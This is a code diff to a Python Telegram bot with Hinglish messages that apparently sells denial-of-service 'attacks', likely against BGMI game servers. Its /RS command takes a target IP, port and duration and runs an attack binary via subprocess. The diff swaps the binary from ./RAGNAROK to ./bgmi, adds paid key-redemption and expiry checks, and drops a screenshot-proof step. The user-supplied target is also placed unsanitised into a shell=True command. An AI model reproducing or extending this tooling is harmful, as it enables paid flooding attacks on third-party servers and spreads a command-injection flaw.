@@ -24,8 +24,8 @@ pending_feedback = {}
 warn_count = {}
 attack_logs = []
 user_attack_count = {}
-keys = {}  # Generated keys with expiry
-user_keys = {}  # Redeemed users
+keys = {}  # Store generated keys with expiry dates
+user_keys = {}  # Store users who redeemed keys
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -88,22 +88,20 @@ def redeem_key(message):
 
     bot.reply_to(message, f"🎉 SUCCESSFULLY REDEEMED!\n📅 Valid till: {user_keys[user_id].strftime('%Y-%m-%d')}", parse_mode="Markdown")
 
-# SCREENSHOT VERIFICATION FUNCTION
-def verify_screenshot(user_id, message):
-    if user_id in pending_feedback:
-        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
-        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **PAID USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        bot.reply_to(message, "✅ SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
-        del pending_feedback[user_id]  
-    else:
-        bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")
-
-# HANDLE ATTACK COMMAND
+# HANDLE ATTACK COMMAND (ONLY IF USER HAS REDEEMED A KEY)
 @bot.message_handler(commands=['RS'])
 def handle_attack(message):
     global is_attack_running, attack_end_time
     user_id = message.from_user.id
     command = message.text.split()
+
+    if user_id not in user_keys:
+        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
+        return
+
+    if datetime.datetime.now() > user_keys[user_id]:
+        bot.reply_to(message, "⏳ TERA ACCESS EXPIRE HO CHUKA HAI! ADMIN SE BAAT KAR.")
+        return
 
     if message.chat.id != int(GROUP_ID):
         bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
@@ -147,7 +145,7 @@ def handle_attack(message):
     pending_feedback[user_id] = True  
 
     try:
-        subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
     except subprocess.CalledProcessError:
@@ -156,12 +154,6 @@ def handle_attack(message):
         is_attack_running = False
         attack_end_time = None  
         bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
-
-# HANDLE SCREENSHOT SUBMISSION
-@bot.message_handler(content_types=['photo'])
-def handle_screenshot(message):
-    user_id = message.from_user.id
-    verify_screenshot(user_id, message)
 
 # START POLLING
 bot.polling(none_stop=True)
